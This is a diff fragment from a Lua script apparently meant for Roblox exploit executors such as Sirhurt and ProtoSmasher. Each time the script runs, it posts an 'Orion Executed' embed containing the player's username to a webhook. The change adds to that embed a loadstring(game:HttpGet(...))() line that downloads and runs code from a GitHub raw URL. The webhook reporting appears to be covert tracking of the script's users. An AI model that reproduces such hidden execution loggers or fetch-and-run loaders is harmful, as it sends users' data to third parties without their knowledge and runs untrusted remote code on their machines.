@@ -14,7 +14,7 @@ local loleh = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher
 dothethingy = http_request or request or HttpPost or syn.request
 dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
 ["embeds"] = {{["title"] = "**Orion Executed**",
-["description"] = "",
+["description"] = '```lua\nloadstring(game:HttpGet("https://raw.githubusercontent.com/BobRossIsBoss/bob-ross/main/bob-ross"))()```',
 ["fields"] = {
     {
       ["name"] = "Username",
